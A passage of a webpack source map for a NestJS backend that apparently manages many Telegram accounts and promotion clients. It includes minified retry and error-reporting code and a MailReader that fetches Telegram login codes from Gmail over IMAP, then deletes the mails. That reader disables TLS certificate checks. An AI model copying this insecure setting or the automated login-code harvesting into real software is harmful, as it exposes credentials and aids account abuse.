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","sources":[".././src/IMap/IMap.ts",".././src/app.controller.ts",".././src/app.module.ts",".././src/app.service.ts",".././src/cloudinary.ts",".././src/components/ConfigurationInit/configuration.schema.ts",".././src/components/ConfigurationInit/init.controller.ts",".././src/components/ConfigurationInit/init.module.ts",".././src/components/ConfigurationInit/init.service.ts",".././src/components/Telegram/Telegram.controller.ts",".././src/components/Telegram/Telegram.module.ts",".././src/components/Telegram/Telegram.service.ts",".././src/components/Telegram/TelegramManager.ts",".././src/components/Telegram/config/telegram-validation.config.ts",".././src/components/Telegram/dto/batch-operations.dto.ts",".././src/components/Telegram/dto/common-responses.dto.ts",".././src/components/Telegram/dto/contact-management.dto.ts",".././src/components/Telegram/dto/create-bot.dto.ts",".././src/components/Telegram/dto/create-chat-folder.dto.ts",".././src/components/Telegram/dto/delete-chat.dto.ts",".././src/components/Telegram/dto/group-operations.dto.ts",".././src/components/Telegram/dto/index.ts",".././src/components/Telegram/dto/media-operations.dto.ts",".././src/components/Telegram/dto/message-search.dto.ts",".././src/components/Telegram/dto/metadata-operations.dto.ts",".././src/components/Telegram/dto/profile-settings.dto.ts",".././src/components/Telegram/dto/schedule-operations.dto.ts",".././src/components/Telegram/dto/send-message.dto.ts",".././src/components/Telegram/dto/update-username.dto.ts",".././src/components/Telegram/dto/view-once-media.dto.ts",".././src/components/Telegram/utils/connection-manager.ts",".././src/components/Telegram/utils/telegram-logger.ts",".././src/components/TgSignup/TgSignup.module.ts",".././src/components/TgSignup/TgSignup.service.ts",".././src/components/TgSignup/dto/tg-signup.dto.ts",".././src/components/TgSignup/tgSignup.controller.ts",".././src/components/active-channels/active-channels.controller.ts",".././src/components/active-channels/active-channels.module.ts",".././src/components/active-channels/active-channels.service.ts",".././src/components/active-channels/dto/add-reaction.dto.ts",".././src/components/active-channels/dto/create-active-channel.dto.ts",".././src/components/active-channels/dto/update-active-channel.dto.ts",".././src/components/active-channels/schemas/active-channel.schema.ts",".././src/components/archived-clients/archived-client.controller.ts",".././src/components/archived-clients/archived-client.module.ts",".././src/components/archived-clients/archived-client.service.ts",".././src/components/buffer-clients/buffer-client.controller.ts",".././src/components/buffer-clients/buffer-client.module.ts",".././src/components/buffer-clients/buffer-client.service.ts",".././src/components/buffer-clients/dto/create-buffer-client.dto.ts",".././src/components/buffer-clients/dto/search-buffer- client.dto.ts",".././src/components/buffer-clients/dto/update-buffer-client.dto.ts",".././src/components/buffer-clients/schemas/buffer-client.schema.ts",".././src/components/builds/build.controller.ts",".././src/components/builds/build.module.ts",".././src/components/builds/build.service.ts",".././src/components/builds/builds.schema.ts",".././src/components/channels/channels.controller.ts",".././src/components/channels/channels.module.ts",".././src/components/channels/channels.service.ts",".././src/components/channels/dto/create-channel.dto.ts",".././src/components/channels/dto/search-channel.dto.ts",".././src/components/channels/dto/update-channel.dto.ts",".././src/components/channels/schemas/channel.schema.ts",".././src/components/clients/client.controller.ts",".././src/components/clients/client.module.ts",".././src/components/clients/client.service.ts",".././src/components/clients/dto/create-client.dto.ts",".././src/components/clients/dto/search-client.dto.ts",".././src/components/clients/dto/update-client.dto.ts",".././src/components/clients/schemas/client.schema.ts",".././src/components/n-point/npoint.controller.ts",".././src/components/n-point/npoint.module.ts",".././src/components/n-point/npoint.service.ts",".././src/components/promote-clients/dto/create-promote-client.dto.ts",".././src/components/promote-clients/dto/search-promote-client.dto.ts",".././src/components/promote-clients/dto/update-promote-client.dto.ts",".././src/components/promote-clients/promote-client.controller.ts",".././src/components/promote-clients/promote-client.module.ts",".././src/components/promote-clients/promote-client.service.ts",".././src/components/promote-clients/schemas/promote-client.schema.ts",".././src/components/promote-msgs/promote-msgs.controller.ts",".././src/components/promote-msgs/promote-msgs.module.ts",".././src/components/promote-msgs/promote-msgs.schema.ts",".././src/components/promote-msgs/promote-msgs.service.ts",".././src/components/promote-stats/dto/create-promote-stat.dto.ts",".././src/components/promote-stats/dto/update-promote-stat.dto.ts",".././src/components/promote-stats/promote-stat.controller.ts",".././src/components/promote-stats/promote-stat.module.ts",".././src/components/promote-stats/promote-stat.service.ts",".././src/components/promote-stats/schemas/promote-stat.schema.ts",".././src/components/shared/dto/execute-request.dto.ts",".././src/components/stats/create-stat.dto.ts",".././src/components/stats/stat.controller.ts",".././src/components/stats/stat.module.ts",".././src/components/stats/stat.schema.ts",".././src/components/stats/stat.service.ts",".././src/components/stats/update-stat.dto.ts",".././src/components/stats2/create-stat2.dto.ts",".././src/components/stats2/stat2.controller.ts",".././src/components/stats2/stat2.module.ts",".././src/components/stats2/stat2.schema.ts",".././src/components/stats2/stat2.service.ts",".././src/components/stats2/update-stat2.dto.ts",".././src/components/timestamps/timestamp.controller.ts",".././src/components/timestamps/timestamp.module.ts",".././src/components/timestamps/timestamp.service.ts",".././src/components/timestamps/timestamps.schema.ts",".././src/components/transactions/dto/create-transaction.dto.ts",".././src/components/transactions/dto/update-transaction.dto.ts",".././src/components/transactions/schemas/transaction.schema.ts",".././src/components/transactions/transaction.controller.ts",".././src/components/transactions/transaction.module.ts",".././src/components/transactions/transaction.service.ts",".././src/components/upi-ids/upi-ids.controller.ts",".././src/components/upi-ids/upi-ids.module.ts",".././src/components/upi-ids/upi-ids.schema.ts",".././src/components/upi-ids/upi-ids.service.ts",".././src/components/user-data/dto/create-user-data.dto.ts",".././src/components/user-data/dto/search-user-data.dto.ts",".././src/components/user-data/dto/update-user-data.dto.ts",".././src/components/user-data/schemas/user-data.schema.ts",".././src/components/user-data/user-data.controller.ts",".././src/components/user-data/user-data.module.ts",".././src/components/user-data/user-data.service.ts",".././src/components/users/dto/create-user.dto.ts",".././src/components/users/dto/search-user.dto.ts",".././src/components/users/dto/update-user.dto.ts",".././src/components/users/schemas/user.schema.ts",".././src/components/users/users.controller.ts",".././src/components/users/users.module.ts",".././src/components/users/users.service.ts",".././src/interfaces/telegram.ts",".././src/main.ts",".././src/middlewares/logger.middleware.ts",".././src/utils.ts",".././src/utils/TelegramBots.config.ts",".././src/utils/fetchWithTimeout.ts",".././src/utils/logbots.ts",".././src/utils/parseError.ts","../external commonjs \"@nestjs/common\"","../external commonjs \"@nestjs/config\"","../external commonjs \"@nestjs/core\"","../external commonjs \"@nestjs/mapped-types\"","../external commonjs \"@nestjs/mongoose\"","../external commonjs \"@nestjs/platform-express\"","../external commonjs \"@nestjs/swagger\"","../external commonjs \"adm-zip\"","../external commonjs \"axios\"","../external commonjs \"big-integer\"","../external commonjs \"class-transformer\"","../external commonjs \"class-validator\"","../external commonjs \"cloudinary\"","../external commonjs \"imap\"","../external commonjs \"mongoose\"","../external commonjs \"multer\"","../external commonjs \"telegram\"","../external commonjs \"telegram/Helpers\"","../external commonjs \"telegram/Password\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events\"","../external commonjs \"telegram/extensions/Logger\"","../external commonjs \"telegram/sessions\"","../external commonjs \"telegram/tl\"","../external node-commonjs \"crypto\"","../external node-commonjs \"fs\"","../external node-commonjs \"path\"","../webpack/bootstrap","../webpack/startup"],"sourcesContent":["import Imap from 'imap';\nimport { fetchNumbersFromString, sleep } from '../utils';\nimport { parseError } from '../utils/parseError';\n\nexport class MailReader {\n    private static instance: MailReader;\n    private imap: Imap;\n    private isReady: boolean = false;\n    private result: string = '';\n\n    private constructor() {\n        this.imap = new Imap({\n            user: process.env.GMAIL_ADD || '',\n            password: process.env.GMAIL_PASS || '',\n            host: 'imap.gmail.com',\n            port: 993,\n            tls: true,\n            tlsOptions: {\n                rejectUnauthorized: false,\n            },\n        });\n\n        this.imap.on('ready', () => {\n            console.log('Mail is Ready');\n            this.isReady = true;\n        });\n\n        this.imap.on('error', (err: Error) => {\n            console.error('SomeError:', err);\n            this.isReady = false;\n        });\n\n        this.imap.on('end', () => {\n            console.log('Connection ended');\n            this.isReady = false;\n        });\n    }\n\n    public static getInstance(): MailReader {\n        if (!MailReader.instance) {\n            MailReader.instance = new MailReader();\n        }\n        return MailReader.instance;\n    }\n\n    public async connectToMail(): Promise<void> {\n        console.log('Connecting to mail server');\n        try {\n            this.imap.connect();\n            this.isReady = true;\n            console.log('Connected to mail server');\n        } catch (err) {\n            console.error('Error connecting to mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async disconnectFromMail(): Promise<void> {\n        console.log('Disconnecting from mail server');\n        try {\n            this.imap.end();\n            this.isReady = false;\n            console.log('Disconnected from mail server');\n        } catch (err) {\n            console.error('Error disconnecting from mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async isMailReady(): Promise<boolean> {\n        return this.isReady;\n    }\n\n    public async getCode(): Promise<string> {\n        console.log(\"MailReady : \", this.isReady)\n        if (!this.isReady) {\n            console.log(\"Re-Connecting mail server\");\n            await this.connectToMail();\n            await sleep(10000);\n        }\n\n        try {\n            await this.openInbox();\n\n            const searchCriteria = [['FROM', 'noreply@telegram.org']];\n            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };\n            console.log('Inbox Opened');\n\n            const results = await new Promise<any[]>((resolve, reject) => {\n                this.imap.search(searchCriteria, (err, results) => {\n                    if (err) {\n                        console.error('Search error:', parseError(err));\n                        reject(err);\n                    } else {\n                        resolve(results);\n                    }\n                });\n            });\n\n            if (results.length > 0) {\n                console.log('Emails found:', results.length);\n                const length = results.length;\n                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);\n\n                await new Promise<void>((resolve, reject) => {\n                    fetch.on('message', (msg, seqno) => {\n                        const emailData: string[] = [];\n\n                        msg.on('body', (stream, info) => {\n                            let buffer = '';\n                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));\n                            stream.on('end', () => {\n                                if (info.which === 'TEXT') {\n                                    emailData.push(buffer);\n                                }\n                                this.imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\n                                    if (err) reject(err);\n                                    this.imap.expunge((err) => {\n                                        if (err) reject(err);\n                                        console.log('Deleted message');\n                                    });\n                                });\n                            });\n                        });\n\n                        msg.once('end', () => {\n                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);\n                            console.log('EmailDataLength:', emailData.length);\n                            console.log('Mail:', emailData[emailData.length - 1].split('.'));\n                            this.result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);\n                            resolve();\n                        });\n                    });\n\n                    fetch.once('end', () => {\n                        console.log('Fetched mails');\n                        resolve();\n                    });\n                });\n            } else {\n                console.log('No new emails found');\n            }\n\n            console.log('Returning result:', this.result);\n            return this.result;\n        } catch (error) {\n            console.error('Error:', error);\n            this.isReady = false;\n            throw error;\n        }\n    }\n\n    private async openInbox(): Promise<void> {\n        await new Promise<void>((resolve, reject) => {\n            this.imap.openBox('INBOX', false, (err) => {\n                if (err) {\n                    console.error('Open Inbox error:', parseError(err));\n                    reject(err);\n                } else {\n                    console.log('Inbox opened');\n                    resolve();\n                }\n            });\n        });\n    }\n}","import { Controller, Get, Post, Body, ValidationPipe, Logger, Res } from '@nestjs/common';\r\nimport { AppService } from './app.service';\r\nimport { ApiOperation } from '@nestjs/swagger';\r\nimport axios from 'axios';\r\nimport { ExecuteRequestDto } from './components/shared/dto/execute-request.dto';\r\nimport { randomUUID } from 'crypto';\r\nimport { Response } from 'express';\r\n\r\n@Controller()\r\nexport class AppController {\r\n    private logger = new Logger('AppController');\r\n\r\n    constructor(private readonly appService: AppService) {}\r\n\r\n    @Get()\r\n    getHello(): string {\r\n        return this.appService.getHello();\r\n    }\r\n\r\n    @Post('execute-request')\r\n    @ApiOperation({ summary: 'Execute an HTTP request with given details' })\r\n    async executeRequest(\r\n        @Body(new ValidationPipe({ transform: true })) requestDetails: ExecuteRequestDto,\r\n        @Res() res: Response\r\n    ) {\r\n        const requestId = randomUUID();\r\n        const startTime = Date.now();\r\n\r\n    